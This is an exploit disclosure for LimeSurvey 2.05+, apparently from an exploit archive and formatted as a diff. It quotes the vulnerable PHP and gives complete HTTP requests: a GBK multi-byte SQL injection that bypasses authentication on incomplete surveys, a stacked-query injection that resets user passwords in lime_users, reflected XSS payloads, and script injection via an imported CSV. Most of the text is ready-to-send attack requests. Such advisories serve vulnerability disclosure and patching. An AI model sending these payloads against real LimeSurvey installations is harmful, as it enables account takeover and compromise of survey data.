@@ -1,0 +1,102 @@
+id: 22406
+date: 07/06/2014
+title: LimeSurvey 2.05+ Multiple Vulnerabilities
+author: Giuseppe D'Amore
+cves: 
+
+[VULNERABILITY DETAILS]
+Multi-Byte SQL Injection
+------------------------
+
+As shown in frontend_helper.php:
+
+******************************************************************
+function loadanswers()
+{
+    global $surveyid;
+    global $thissurvey, $thisstep;
+    global $clienttoken;
+    $clang = Yii::app()->lang;
+
+    $scid=returnGlobal('scid',true);
+    if (Yii::app()->request->getParam('loadall') == "reload")
+    {
+        $query = "SELECT * FROM {{saved_control}} INNER JOIN {$thissurvey['tablename']}
+        ON {{saved_control}}.srid = {$thissurvey['tablename']}.id
+        WHERE {{saved_control}}.sid=$surveyid\n";
+        if (isset($scid)) //Would only come from email
+
+        {
+            $query .= "AND {{saved_control}}.scid={$scid}\n";
+        }
+        $query .="AND {{saved_control}}.identifier = '".autoEscape($_SESSION['survey_'.$surveyid]['holdname'])."' ";
+******************************************************************
+
+the function autoEscape is applied on the holdname parameter, this function is defined in the file common_helper.php
+
+******************************************************************
+function autoEscape($str) {
+    if (!get_magic_quotes_gpc()) {
+        return addslashes ($str);
+    }
+    return $str;
+}
+******************************************************************
+
+addslashes can be bypassed using the GBK charset. So sending this request:
+
+******************************************************************
+POST /limesurvey/index.php?r=survey/index HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:30.0) Gecko/20100101 Firefox/30.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/limesurvey/index.php?r=survey/index
+Cookie: PHPSESSID=as31m846sa46p2uqso1eopc587; YII_CSRF_TOKEN=a3d3b2de671e18e0eb5b9fbe64f049a66bfe23b2
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 125
+
+YII_CSRF_TOKEN=a3d3b2de671e18e0eb5b9fbe64f049a66bfe23b2&loadname=chr(0x87) . "' OR 1=1 -- ";&loadpass=test&loadsecurity=89&sid=713149&loadall=reload
+*******************************************************************
+
+it is possible to bypass imcomplete survey authentication.
+
+Stacked Query SQL Injection
+---------------------------
+
+Sending this request:
+
+*******************************************************************
+POST /limesurvey/index.php?r=admin/participants/sa/getParticipants_json HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:30.0) Gecko/20100101 Firefox/30.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://localhost/limesurvey/index.php?r=admin/participants/sa/displayParticipants
+Content-Length: 141
+Cookie: PHPSESSID=as31m846sa46p2uqso1eopc587; YII_CSRF_TOKEN=a3d3b2de671e18e0eb5b9fbe64f049a66bfe23b2
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+YII_CSRF_TOKEN=a3d3b2de671e18e0eb5b9fbe64f049a66bfe23b2&searchcondition=&_search=false&nd=1404300424270&rows=25&page=1&sidx=lastname]; update lime_users set password='880e042d271f08cd3c456f28704702a6b0ad1c7b442f257bf40578112c8e6ffb';+--+P&sord=asc
+********************************************************************
+
+it is possible to change the users's password.
+
+Reflected XSS
+-------------
+GET /limesurvey/index.php?r=admin%2fparticipants%2fsa%2fgetAttribute_json%2fpid%2f9b0039e2-b346-473d-901f-7010d2bc88c16c2d4<img%20src%3da%20onerror%3dalert(1)>9b6d6fe2f71&YII_CSRF_TOKEN=76fa68bdfde6a997ee64f01726234fd7897e2289&_search=false&nd=140420566784
+GET /limesurvey/index.php?r=admin/globalsettings&sa=a"><script>alert(1)</script>a
+
+XSS via CSV
+-----------
+
+it is possible to create a .csv file with inside <script>alert(2)</script>,0 and and upload it with the functionality "Import CSV".
+
+#  0day.today [2023-03-22]  #
